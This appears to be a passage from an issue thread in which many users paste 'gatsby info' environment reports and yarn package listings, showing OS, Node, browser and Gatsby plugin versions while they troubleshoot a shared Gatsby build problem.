=> 2.3.12 gatsby-source-mongodb: 2.3.4 => 2.3.4 gatsby-transformer-remark: 2.8.17 => 2.8.17 gatsby-transformer-sharp: 2.5.5 => 2.5.5 gatsby-transformer-yaml: 2.4.4 => 2.4.4 npmglobalpackages: gatsby-cli: 2.7.53 gatsby: 2.23.7 *note* i have tried with 2.23.7 as well with no luck
$ gatsby info --clipboard system: os: windows 8.1 cpu: (4) x64 intel(r) core(tm) i3-5010u cpu @ 2.10ghz binaries: npm: 6.13.1 - c:\\program files\ odejs\ pm.cmd npmpackages: gatsby: ^2.23.0 => 2.23.7 gatsby-plugin-feed: ^2.0.8 => 2.5.5 gatsby-plugin-google-analytics: ^2.0.5 => 2.3.4 gatsby-plugin-manifest: ^2.0.5 => 2.4.12 gatsby-plugin-offline: ^3.0.30 => 3.2.11 gatsby-plugin-react-helmet: ^3.0.0 => 3.3.4 gatsby-plugin-sharp: ^2.0.16 => 2.6.12 gatsby-plugin-sitemap: ^2.0.4 => 2.4.5 gatsby-plugin-typography: ^2.2.0 => 2.5.4 gatsby-remark-autolink-headers: ^2.0.12 => 2.3.5 gatsby-remark-copy-linked-files: ^2.0.5 => 2.3.5 gatsby-remark-images: ^3.1.39 => 3.3.11 gatsby-remark-prismjs: ^3.0.0 => 3.5.4 gatsby-remark-responsive-iframe: ^2.0.5 => 2.4.5 gatsby-remark-smartypants: ^2.0.5 => 2.3.4 gatsby-source-filesystem: ^2.0.12 => 2.3.12 gatsby-transformer-remark: ^2.1.17 => 2.8.17 gatsby-transformer-sharp: ^2.1.9 => 2.5.5
system: os: linux 4.4 ubuntu 18.04.4 lts (bionic beaver) cpu: (8) x64 intel(r) core(tm) i7-8650u cpu @ 1.90ghz shell: 4.4.20 - /bin/bash binaries: node: 10.19.0 - /usr/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.5 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python npmpackages: gatsby: ^2.23.3 => 2.23.3 gatsby-image: ^2.4.7 => 2.4.7 gatsby-plugin-manifest: ^2.4.11 => 2.4.11 gatsby-plugin-offline: ^3.2.9 => 3.2.9 gatsby-plugin-react-helmet: ^3.3.4 => 3.3.4 gatsby-plugin-sharp: ^2.6.11 => 2.6.11 gatsby-source-filesystem: ^2.3.11 => 2.3.11 gatsby-transformer-sharp: ^2.5.5 => 2.5.5 npmglobalpackages: gatsby-cli: 2.12.44
![annotation 2020-06-19 213827](
juanda@juanda-xps-8500:~/web-aeducar$ gatsby info --clipboard system: os: linux 5.3 ubuntu 18.04.3 lts (bionic beaver) cpu: (8) x64 intel(r) core(tm) i7-3770 cpu @ 3.40ghz shell: 5.4.2 - /usr/bin/zsh binaries: node: 12.16.2 - ~/.nvm/versions/node/v12.16.2/bin/node npm: 6.14.4 - ~/.nvm/versions/node/v12.16.2/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 76.0.3809.100 firefox: 77.0.1 npmpackages: gatsby: 2.23.5 => 2.23.5 gatsby-image: ^2.4.6 => 2.4.6 gatsby-plugin-feed-mdx: ^1.0.1 => 1.0.1 gatsby-plugin-material-ui: latest => 2.1.9 gatsby-plugin-mdx: ^1.2.15 => 1.2.15 gatsby-plugin-netlify-cms: ^4.3.5 => 4.3.5 gatsby-plugin-react-helmet: latest => 3.3.4 gatsby-plugin-react-leaflet: ^2.0.13 => 2.0.13 gatsby-plugin-sharp: ^2.6.10 => 2.6.10 gatsby-plugin-styled-components: ^3.3.4 => 3.3.4 gatsby-remark-copy-linked-files: ^2.3.5 => 2.3.5 gatsby-remark-images: ^3.3.10 => 3.3.10 gatsby-remark-prismjs: ^3.5.4 => 3.5.4 gatsby-remark-responsive-iframe: ^2.4.5 => 2.4.5 gatsby-remark-smartypants: ^2.3.4 => 2.3.4 gatsby-source-filesystem: ^2.3.10 => 2.3.10 gatsby-transformer-json: ^2.4.4 => 2.4.4 gatsby-transformer-remark: ^2.8.15 => 2.8.15 gatsby-transformer-sharp: ^2.5.4 => 2.5.4 npmglobalpackages: gatsby: 2.23.4 ```
microsoft edge 41.16299.1480.0
microsoft edgehtml 16.16299
``` system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-4980hq cpu @ 2.80ghz shell: 5.3 - /bin/zsh binaries: node: 14.3.0 - ~/.nvm/versions/node/v14.3.0/bin/node npm: 6.14.5 - ~/.nvm/versions/node/v14.3.0/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 83.0.4103.106 firefox: 71.0 safari: 13.1.1 npmpackages: gatsby: ^2.23.3 => 2.23.3 gatsby-plugin-mdx: ^1.2.16 => 1.2.16 gatsby-plugin-sharp: ^2.6.12 => 2.6.12 gatsby-remark-images: ^3.3.11 => 3.3.11 gatsby-source-filesystem: ^2.3.12 => 2.3.12 npmglobalpackages: gatsby-cli: 2.12.47
``` system: os: linux 5.4 ubuntu 20.04 lts (focal fossa) cpu: (4) x64 intel(r) core(tm) i7-4600u cpu @ 2.10ghz shell: 5.8 - /usr/bin/zsh binaries: node: 14.0.0 - /tmp/yarn--1592602248793-0.4741856971078775/node yarn: 1.22.4 - /tmp/yarn--1592602248793-0.4741856971078775/yarn npm: 6.14.4 - ~/.nvm/versions/node/v14.0.0/bin/npm languages: python: 2.7.18 - /usr/bin/python browsers: firefox: 76.0.1 npmpackages: gatsby: ^2.15.28 => 2.15.28 gatsby-image: ^2.2.23 => 2.2.23 gatsby-plugin-manifest: ^2.2.20 => 2.2.20 gatsby-plugin-mdx: ^1.0.46 => 1.2.16 gatsby-plugin-offline: ^3.0.11 => 3.0.11 gatsby-plugin-postcss: ^2.3.4 => 2.3.4 gatsby-plugin-react-helmet: ^3.1.10 => 3.1.10 gatsby-plugin-sass: ^2.1.17 => 2.1.17 gatsby-plugin-sharp: ^2.2.27 => 2.2.27 gatsby-remark-images: ^3.1.25 => 3.1.25 gatsby-remark-prismjs: ^3.3.24 => 3.3.24 gatsby-remark-smartypants: ^2.1.16 => 2.1.16 gatsby-source-filesystem: ^2.1.28 => 2.1.28 gatsby-transformer-sharp: ^2.2.19 => 2.2.19 ```
reproduced locally and on netlify
``` system: os: macos 10.15.5 cpu: (6) x64 intel(r) core(tm) i5-8500b cpu @ 3.00ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.4.0 - /usr/local/bin/node npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 83.0.4103.106 firefox: 77.0.1 safari: 13.1.1 npmpackages: gatsby: ^2.23.3 => 2.23.3 gatsby-image: ^2.4.7 => 2.4.7 gatsby-plugin-manifest: ^2.4.11 => 2.4.11 gatsby-plugin-offline: ^3.2.9 => 3.2.9 gatsby-plugin-react-helmet: ^3.3.4 => 3.3.4 gatsby-plugin-sharp: ^2.6.11 => 2.6.11 gatsby-source-filesystem: ^2.3.11 => 2.3.11 gatsby-transformer-sharp: ^2.5.5 => 2.5.5 ```
system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.106 firefox: 76.0 safari: 13.1 npmpackages: gatsby: ^2.23.3 => 2.23.3 gatsby-plugin-emotion: ^4.3.4 => 4.3.4 gatsby-plugin-typography: ^2.5.4 => 2.5.4 gatsby-source-filesystem: ^2.3.11 => 2.3.11 gatsby-transformer-remark: ^2.8.16 => 2.8.16 npmglobalpackages: gatsby-cli: 2.12.45
``` system: os: linux 5.4 ubuntu 20.04 lts (focal fossa) cpu: (4) x64 intel(r) core(tm) i5-4210u cpu @ 1.70ghz shell: 5.0.16 - /bin/bash binaries: node: 14.3.0 - ~/.nvm/versions/node/v14.3.0/bin/node npm: 6.14.5 - ~/.nvm/versions/node/v14.3.0/bin/npm browsers: chrome: 83.0.4103.106 firefox: 77.0.1 npmpackages: gatsby: ^2.23.3 => 2.23.3 gatsby-theme-blog: ^1.6.42 => 1.6.42 npmglobalpackages: gatsby-cli: 2.12.46
system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i5-1038ng7 cpu @ 2.00ghz shell: 5.0.17 - /usr/local/bin/bash binaries: node: 14.4.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 3.7.7 - /users/will/.pyenv/shims/python browsers: chrome: 83.0.4103.97 firefox: 77.0.1 safari: 13.1.1 npmpackages: gatsby: 2.23.3 => 2.23.3 gatsby-cli: 2.12.45 => 2.12.45 gatsby-image: 2.4.7 => 2.4.7 gatsby-plugin-algolia: 0.11.1 => 0.11.1 gatsby-plugin-canonical-urls: 2.3.4 => 2.3.4 gatsby-plugin-catch-links: 2.3.5 => 2.3.5 gatsby-plugin-feed: 2.5.5 => 2.5.5 gatsby-plugin-google-analytics: 2.3.4 => 2.3.4 gatsby-plugin-manifest: 2.4.11 => 2.4.11 gatsby-plugin-offline: 3.2.9 => 3.2.9 gatsby-plugin-react-helmet: 3.3.4 => 3.3.4 gatsby-plugin-sharp: 2.6.11 => 2.6.11 gatsby-plugin-styled-components: 3.3.4 => 3.3.4 gatsby-plugin-typography: 2.5.4 => 2.5.4 gatsby-remark-copy-linked-files: 2.3.5 => 2.3.5 gatsby-remark-images: 3.3.10 => 3.3.10 gatsby-remark-prismjs: 3.5.4 => 3.5.4 gatsby-remark-responsive-iframe: 2.4.5 => 2.4.5 gatsby-remark-smartypants: 2.3.4 => 2.3.4 gatsby-source-filesystem: 2.3.11 => 2.3.11 gatsby-transformer-remark: 2.8.15 => 2.8.15 gatsby-transformer-sharp: 2.5.5 => 2.5.5
``` system: os: linux 5.4 manjaro linux cpu: (4) x64 intel(r) core(tm) i5-6500 cpu @ 3.20ghz shell: 5.0.16 - /bin/bash binaries: node: 14.4.0 - ~/.asdf/installs/nodejs/14.4.0/bin/node yarn: 1.22.4 - ~/.asdf/installs/nodejs/14.4.0/.npm/bin/yarn npm: 6.14.5 - ~/.asdf/installs/nodejs/14.4.0/bin/npm languages: python: 3.8.2 browsers: firefox: 76.0.1 npmpackages: gatsby: ^2.23.3 => 2.23.3 gatsby-image: ^2.4.7 => 2.4.7 gatsby-plugin-remote-images: ^2.1.0 => 2.1.0 gatsby-plugin-sharp: ^2.6.11 => 2.6.11 gatsby-plugin-styled-components: ^3.3.4 => 3.3.4 gatsby-source-filesystem: ^2.3.11 => 2.3.11 gatsby-transformer-sharp: ^2.5.5 => 2.5.5 gatsby-transformer-yaml: ^2.4.4 => 2.4.4 npmglobalpackages: gatsby-cli: 2.12.43
``` `gatsby info --clipboard` is inaccurate with languages and browsers if that's meant to be system installed
i have many more languages and browsers on the system, although not relevant to this issue.
`system: os: windows 10 10.0.18362 cpu: (4) x64 intel(r) core(tm) i5-7300u cpu @ 2.60ghz binaries: node: 12.6.0 - c:\\program files\ odejs\ ode.exe npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd languages: python: 3.7.7 browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.23.3 => 2.23.3 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sass: ^2.3.3 => 2.3.3 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.12.45`
``` system: os: linux 5.4 ubuntu 20.04 lts (focal fossa) cpu: (12) x64 intel(r) xeon(r) e-2186m cpu @ 2.90ghz shell: 5.8 - /usr/bin/zsh binaries: node: 12.18.0 - ~/opt/n/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.4 - ~/opt/n/bin/npm browsers: chrome: 83.0.4103.106 firefox: 77.0.1 npmpackages: gatsby: ^2.13.50 => 2.23.3 gatsby-image: ^2.2.8 => 2.4.7 gatsby-plugin-manifest: ^2.2.4 => 2.4.11 gatsby-plugin-mdx: ^1.0.0 => 1.2.15 gatsby-plugin-offline: ^2.2.4 => 2.2.10 gatsby-plugin-react-helmet: ^3.1.3 => 3.3.4 gatsby-plugin-sharp: ^2.2.9 => 2.6.11 gatsby-source-filesystem: ^2.1.8 => 2.3.11 gatsby-transformer-sharp: ^2.2.5 => 2.5.5
system: os: linux 4.15 ubuntu 18.04.4 lts (bionic beaver) cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz shell: 4.4.20 - /bin/bash binaries: node: 10.20.1 - ~/.nvm/versions/node/v10.20.1/bin/node yarn: 1.12.3 - /usr/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v10.20.1/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 83.0.4103.97 firefox: 77.0.1 npmpackages: gatsby: ^2.19.7 => 2.22.11 gatsby-image: ^2.4.7 => 2.4.7 gatsby-plugin-apollo: ^3.0.1 => 3.0.1 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-manifest: ^2.2.39 => 2.4.9 gatsby-plugin-offline: ^3.0.32 => 3.2.7 gatsby-plugin-react-helmet: ^3.1.21 => 3.3.2 gatsby-plugin-react-redux: ^1.1.0-0 => 1.1.0-0 gatsby-plugin-sass: ^2.1.30 => 2.3.2 gatsby-plugin-sharp: ^2.4.3 => 2.6.9 gatsby-source-filesystem: ^2.1.46 => 2.3.8 gatsby-source-graphql-universal: 3.3.0 => 3.3.0 gatsby-source-prismic-graphql: ^3.6.2 => 3.6.2 gatsby-transformer-sharp: ^2.3.13 => 2.5.3 npmglobalpackages: gatsby: 2.22.9
``` system: os: windows 10 10.0.19041 cpu: (8) x64 intel(r) core(tm) i5-8250u cpu @ 1.60ghz binaries: node: 12.17.0 - c:\\program files\ odejs\ ode.exe yarn: 1.13.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.2 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.3 - c:\\python38\\python.exe browsers: edge: 44.19041.1.0 npmpackages: gatsby: ^2.21.13 => 2.22.3 gatsby-local-autolink-headers: file:plugins/gatsby-local-autolink-headers => 1.0.0 gatsby-plugin-advanced-sitemap: ^1.5.2 => 1.5.4 gatsby-plugin-catch-links: ^2.3.1 => 2.3.2 gatsby-plugin-manifest: ^2.4.2 => 2.4.8 gatsby-plugin-material-ui: ^2.1.8 => 2.1.8 gatsby-plugin-mdx: ^1.2.6 => 1.2.11 gatsby-plugin-offline: ^3.2.1 => 3.2.6 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.2 gatsby-plugin-webpack-bundle-analyser-v2: ^1.1.10 => 1.1.10 gatsby-remark-copy-linked-files: ^2.3.2 => 2.3.3 gatsby-remark-table-of-contents: 0.0.9 => 0.0.9 gatsby-remark-vscode: ^2.1.1 => 2.1.1 gatsby-source-filesystem: ^2.3.1 => 2.3.7 gatsby-source-local-git: ^1.0.0 => 1.0.0 gatsby-transformer-json: ^2.4.3 => 2.4.3 ```
system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-8559u cpu @ 2.70ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.14.1 - ~/.nvm/versions/node/v12.14.1/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v12.14.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.97 firefox: 77.0.1 safari: 13.1.1 npmpackages: gatsby: ^2.22.15 => 2.23.3 gatsby-image: ^2.4.5 => 2.4.7 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.4.9 => 2.4.11 gatsby-plugin-offline: ^3.2.7 => 3.2.9 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.4 gatsby-plugin-sharp: ^2.6.9 => 2.6.11 gatsby-source-filesystem: ^2.3.8 => 2.3.11 gatsby-transformer-sharp: ^2.5.3 => 2.5.5 npmglobalpackages: gatsby-cli: 2.12.44
system: os: windows 10 10.0.18363 cpu: (12) x64 intel(r) core(tm) i7-10710u cpu @ 1.10ghz binaries: node: 14.4.0 - c:\\program files\ odejs\ ode.exe yarn: 1.22.4 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.14.5 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.3 - /c/python38/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.23.1 => 2.23.3 gatsby-plugin-sass: ^2.3.3 => 2.3.4 gatsby-source-filesystem: ^2.3.10 => 2.3.11 gatsby-transformer-json: ^2.4.4 => 2.4.5 gatsby-transformer-remark: ^2.8.14 => 2.8.15 npmglobalpackages: gatsby-cli: 2.12.44
``` system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.19.0 - ~/.nvm/versions/node/v10.19.0/bin/node yarn: 1.21.0 - ~/.nvm/versions/node/v10.19.0/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v10.19.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.97 safari: 13.1 npmpackages: gatsby: ^2.22.15 => 2.22.12 gatsby-alias-imports: ^1.0.4 => 1.0.4 gatsby-core-utils: ^1.3.3 => 1.3.3 gatsby-design-tokens: ^2.0.6 => 2.0.6 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-canonical-urls: ^2.3.2 => 2.3.2 gatsby-plugin-catch-links: ^2.3.3 => 2.3.3 gatsby-plugin-emotion: ^4.3.2 => 4.3.2 gatsby-plugin-feed: ^2.5.3 => 2.5.3 gatsby-plugin-google-analytics: ^2.3.2 => 2.3.2 gatsby-plugin-google-tagmanager: ^2.3.3 => 2.3.3 gatsby-plugin-guess-js: ^1.3.3 => 1.3.3 gatsby-plugin-layout: ^1.3.2 => 1.3.2 gatsby-plugin-mailchimp: ^2.2.3 => 2.2.3 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-mdx: 1.2.13 => 1.2.8 gatsby-plugin-netlify: ^2.3.3 => 2.3.3 gatsby-plugin-netlify-cache: ^0.1.0 => 0.1.0 gatsby-plugin-nprogress: ^2.3.2 => 2.3.2 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-plugin-sitemap: ^2.4.3 => 2.4.3 gatsby-plugin-theme-ui: ^0.3.0 => 0.3.0 gatsby-plugin-twitter: ^2.3.2 => 2.3.2 gatsby-plugin-typography: ^2.5.2 => 2.5.2 gatsby-remark-autolink-headers: ^2.3.3 => 2.3.3 gatsby-remark-code-titles: ^1.1.0 => 1.1.0 gatsby-remark-copy-linked-files: ^2.3.3 => 2.3.3 gatsby-remark-embedder: ^1.16.0 => 1.16.0 gatsby-remark-graphviz: ^1.3.2 => 1.3.2 gatsby-remark-http-to-https: ^1.0.2 => 1.0.2 gatsby-remark-images: ^3.3.8 => 3.3.8 gatsby-remark-normalize-paths: ^1.0.0 => 1.0.0 gatsby-remark-prismjs: ^3.5.2 => 3.5.2 gatsby-remark-responsive-iframe: ^2.4.3 => 2.4.3 gatsby-remark-smartypants: ^2.3.2 => 2.3.2 gatsby-source-airtable: ^2.1.1 => 2.1.1 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-source-git: ^1.0.2 => 1.0.2 gatsby-source-npm-package-search: ^2.3.4 => 2.3.4 gatsby-transformer-csv: ^2.3.2 => 2.3.2 gatsby-transformer-documentationjs: ^4.3.2 => 4.3.2 gatsby-transformer-gitinfo: ^1.1.0 => 1.1.0 gatsby-transformer-remark: ^2.8.13 => 2.8.13 gatsby-transformer-screenshot: ^2.3.7 => 2.3.7 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 gatsby-transformer-yaml: ^2.4.2 => 2.4.2 npmglobalpackages: gatsby-cli: 2.12.45
``` system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-8569u cpu @ 2.80ghz shell: 5.0.17 - /opt/local/bin/bash binaries: node: 12.16.1 - ~/.asdf/installs/nodejs/12.16.1/bin/node npm: 6.13.4 - ~/.asdf/installs/nodejs/12.16.1/bin/npm languages: python: 3.8.2 - /users/challen/.asdf/shims/python npmpackages: gatsby: 2.23.3 => 2.23.3 gatsby-alias-imports: ^1.0.4 => 1.0.4 gatsby-image: ^2.4.7 => 2.4.7 gatsby-plugin-env-variables: ^1.0.2 => 1.0.2 gatsby-plugin-graphql-codegen: ^2.7.1 => 2.7.1 gatsby-plugin-manifest: ^2.4.11 => 2.4.11 gatsby-plugin-material-ui: ^2.1.9 => 2.1.9 gatsby-plugin-mdx: ^1.2.15 => 1.2.15 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.3.4 => 3.3.4 gatsby-plugin-sass: ^2.3.4 => 2.3.4 gatsby-plugin-sharp: ^2.6.11 => 2.6.11 gatsby-plugin-typescript: ^2.4.6 => 2.4.6 gatsby-plugin-webpack-bundle-analyser-v2: ^1.1.10 => 1.1.10 gatsby-source-filesystem: ^2.3.11 => 2.3.11 gatsby-transformer-sharp: ^2.5.5 => 2.5.5 npmglobalpackages: gatsby-cli: 2.12.44
``` system: os: macos 10.15.3 cpu: (4) x64 intel(r) core(tm) i5-3210m cpu @ 2.50ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.4.0 - /usr/local/bin/node npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.97 firefox: 61.0.1 safari: 13.0.5 npmpackages: gatsby: ^2.3.34 => 2.23.3 gatsby-image: ^2.0.41 => 2.4.7 gatsby-plugin-manifest: ^2.0.29 => 2.4.11 gatsby-plugin-offline: ^2.0.25 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.12 => 3.3.4 gatsby-plugin-sass: ^2.0.11 => 2.3.4 gatsby-plugin-sharp: ^2.0.35 => 2.6.11 gatsby-source-filesystem: ^2.0.33 => 2.3.11 gatsby-transformer-sharp: ^2.1.18 => 2.5.5 npmglobalpackages: gatsby-cli: 2.12.44
<details> <summary>gatsby info --clipboard</summary> ``` system: os: linux 4.19 debian gnu/linux 10 (buster) 10 (buster) cpu: (8) x64 intel(r) core(tm) i7-6770hq cpu @ 2.60ghz shell: 5.7.1 - /usr/bin/zsh binaries: node: 10.20.1 - /tmp/yarn--1591893009228-0.6481271662017773/node yarn: 1.22.4 - /tmp/yarn--1591893009228-0.6481271662017773/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: firefox: 68.8.0esr
``` </details> <details> <summary>yarn list | grep -e "(gatsby-plugin-offline|idb-keyval)" | grep -v deduped</summary> ```
gatsby-plugin-offline@^3.0.35
gatsby-plugin-offline@3.2.1
idb-keyval@^3.2.0
idb-keyval@3.2.0
``` </details>
<details> <summary>gatsby info --clipboard</summary> ``` system: os: linux 4.19 debian gnu/linux 10 (buster) 10 (buster) cpu: (8) x64 intel(r) core(tm) i7-6770hq cpu @ 2.60ghz shell: 5.7.1 - /usr/bin/zsh binaries: node: 10.20.1 - /tmp/yarn--1591893009228-0.6481271662017773/node yarn: 1.22.4 - /tmp/yarn--1591893009228-0.6481271662017773/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: firefox: 68.8.0esr
``` </details> <details> <summary>yarn list | grep gatsby | grep -v deduped</summary> ```
babel-preset-gatsby@0.4.1
gatsby-core-utils@^1.2.1
gatsby-image@^2.4.1
gatsby-plugin-env-variables@^1.0.1
gatsby-plugin-manifest@^2.2.41
gatsby-plugin-nprogress@^2.1.19
gatsby-plugin-offline@^3.0.35
gatsby-plugin-preact@^3.1.26
gatsby-plugin-preload-fonts@^1.0.27
gatsby-plugin-purgecss@^4.0.0
gatsby-plugin-react-helmet@^3.0.4
gatsby-plugin-sass@^2.0.7
gatsby-plugin-sharp@^2.2.9
gatsby-plugin-tinacms@~0.1.37
gatsby-plugin-tslint@^0.0.2
gatsby-plugin-typegen@^2.2.0
gatsby-plugin-typescript@^2.1.5
gatsby-plugin-webpack-bundle-analyser-v2@^1.1.8
gatsby-remark-copy-linked-files@^2.0.7
gatsby-remark-images@^3.1.6
gatsby-remark-relative-images@^0.2.1
gatsby-source-filesystem@^2.0.26
gatsby-source-stripe@^3.0.4
gatsby-tinacms-git@~0.4.11
gatsby-tinacms-json@~0.8.22
gatsby-tinacms-remark@~0.7.18
gatsby-transformer-json@^2.2.25
gatsby-transformer-remark@^2.6.9
gatsby-transformer-sharp@^2.1.9
gatsby@2.21.13
gatsby-cli@2.12.11
gatsby-core-utils@^1.2.1
gatsby-recipes@^0.1.11
gatsby-telemetry@^1.3.2
gatsby-core-utils@1.2.1
gatsby-graphiql-explorer@0.4.1
gatsby-image@2.4.2
gatsby-link@2.4.1
gatsby-page-utils@0.2.1
gatsby-core-utils@^1.2.1
gatsby-plugin-env-variables@1.0.2
gatsby-plugin-manifest@2.4.2
gatsby-core-utils@^1.2.1
gatsby-plugin-nprogress@2.3.1
gatsby-plugin-offline@3.2.1
gatsby-core-utils@^1.2.1
gatsby-plugin-page-creator@2.3.1
gatsby-page-utils@^0.2.1
gatsby-plugin-preact@3.3.1
gatsby-plugin-preload-fonts@1.2.1
gatsby-core-utils@^1.2.1
gatsby-plugin-purgecss@4.0.1
gatsby-plugin-react-helmet@3.3.1
gatsby-plugin-sass@2.3.1
gatsby-plugin-sharp@2.6.1
gatsby-core-utils@^1.2.1
gatsby-plugin-tinacms@0.1.37
gatsby-plugin-tslint@0.0.2
gatsby-plugin-typegen@2.2.0
gatsby-plugin-typescript@2.4.2
gatsby-plugin-webpack-bundle-analyser-v2@1.1.9
gatsby-react-router-scroll@2.3.1
gatsby-recipes@0.1.11
babel-preset-gatsby@^0.4.1
gatsby-core-utils@^1.2.1
gatsby-telemetry@^1.3.2
gatsby-remark-copy-linked-files@2.3.2
gatsby-remark-images@3.3.1
gatsby-core-utils@^1.2.1
gatsby-remark-relative-images@0.2.3
gatsby-source-filesystem@2.3.1
gatsby-core-utils@^1.2.1
gatsby-source-stripe@3.0.7
gatsby-source-filesystem@2.1.55
gatsby-source-filesystem@2.1.55
gatsby-core-utils@^1.0.33
gatsby-telemetry@1.3.2
gatsby-core-utils@^1.2.1
gatsby-tinacms-git@0.4.11
gatsby-tinacms-json@0.8.22
gatsby-tinacms-remark@0.7.18
gatsby-transformer-json@2.4.1
gatsby-transformer-remark@2.8.7
gatsby-core-utils@^1.2.1
gatsby-transformer-sharp@2.5.1
gatsby@2.21.13
babel-preset-gatsby@^0.4.1
gatsby-cli@^2.12.10
gatsby-core-utils@^1.2.1
gatsby-graphiql-explorer@^0.4.1
gatsby-link@^2.4.1
gatsby-plugin-page-creator@^2.3.1
gatsby-plugin-typescript@^2.4.2
gatsby-react-router-scroll@^2.3.1
gatsby-telemetry@^1.3.2
``` </details>
<summary>details</summary> ``` system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.3 - ~/.nvm/versions/node/v12.16.3/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v12.16.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.97 edge: 83.0.478.45 firefox: 76.0.1 safari: 13.1.1 npmpackages: gatsby: ^2.23.3 => 2.23.3 gatsby-plugin-bundle-stats: ^2.2.0 => 2.2.0 gatsby-plugin-canonical-urls: ^2.3.4 => 2.3.4 gatsby-plugin-catch-links: ^2.3.5 => 2.3.5 gatsby-plugin-layout: ^1.3.4 => 1.3.4 gatsby-plugin-manifest: ^2.4.11 => 2.4.11 gatsby-plugin-mdx: ^1.2.15 => 1.2.15 gatsby-plugin-offline: ^3.2.9 => 3.2.9 gatsby-plugin-pnpm: ^1.2.5 => 1.2.5 gatsby-plugin-preact: ^4.0.3 => 4.0.3 gatsby-plugin-react-helmet-async: ^1.0.17-0 => 1.0.17-0 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-remove-generator: ^1.0.5 => 1.0.5 gatsby-plugin-remove-trailing-slashes: ^2.3.5 => 2.3.5 gatsby-plugin-robots-txt: ^1.5.1 => 1.5.1 gatsby-plugin-sass: ^2.3.4 => 2.3.4 gatsby-plugin-sharp: ^2.6.11 => 2.6.11 gatsby-plugin-simple-analytics: ^1.0.3 => 1.0.3 gatsby-plugin-sitemap: ^2.4.5 => 2.4.5 gatsby-remark-autolink-headers: ^2.3.5 => 2.3.5 gatsby-remark-check-links: ^2.1.0 => 2.1.0 gatsby-remark-copy-linked-files: ^2.3.5 => 2.3.5 gatsby-remark-embedder: ^2.1.1 => 2.1.1 gatsby-remark-images: ^3.3.10 => 3.3.10 gatsby-source-filesystem: ^2.3.11 => 2.3.11 gatsby-transformer-json: ^2.4.5 => 2.4.5 gatsby-transformer-sharp: ^2.5.5 => 2.5.5 npmglobalpackages: gatsby-cli: 2.12.29
